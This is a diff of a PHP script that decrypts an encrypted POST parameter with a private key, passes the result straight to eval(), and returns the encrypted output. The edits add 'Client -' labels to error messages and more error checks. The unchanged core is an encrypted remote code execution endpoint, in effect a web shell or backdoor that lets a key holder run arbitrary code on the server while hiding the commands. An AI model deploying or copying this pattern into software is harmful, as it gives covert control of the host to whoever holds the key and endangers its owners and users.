@@ -70,25 +70,28 @@ tLU2ruUH6t15puLHgCZBOG8CAwEAAQ==
 
 if (!isset($_POST[POST_KEY])) {
     header('HTTP/1.1 400 Bad Request');
-    die('Invalid request');
+    die('Client - Invalid request');
 }
 
 $encryptedData = $_POST[POST_KEY];
-$priKey = openssl_pkey_get_private($client_key);
 
-if (!$priKey) {
+if (!$priKey = openssl_pkey_get_private($client_key)) {
     header('HTTP/1.1 500 Internal Server Error');
-    die('loading private key failed');
+    die('Client - loading private key failed');
 }
 
 if (!$decrypted = ssl_decrypt($encryptedData, $priKey)) {
     header('HTTP/1.1 500 Internal Server Error');
-    die('decrypt failed');
+    die('Client - decrypt failed');
 }
 
 $eval_return = eval($decrypted);
 
-$encrypted = ssl_encrypt($eval_return, $server_pub);
+// $encrypted = ssl_encrypt($eval_return, $server_pub);
+if (!$encrypted = ssl_encrypt($eval_return, $server_pub)) {
+    header('HTTP/1.1 500 Internal Server Error');
+    die('Client - encrypt failed');
+}
 
 echo $encrypted;
 
@@ -139,6 +142,12 @@ function ssl_decrypt($source, $pem)
 function ssl_getbits($pem)
 {
     $key = openssl_pkey_get_public($pem);
+    if (is_resource($key)) {
+        $keyinfo = (object) openssl_pkey_get_details($key);
+        return $keyinfo->bits;
+    }
+
+    $key = openssl_pkey_get_private($pem);
     if (is_resource($key)) {
         $keyinfo = (object) openssl_pkey_get_details($key);
         return $keyinfo->bits;
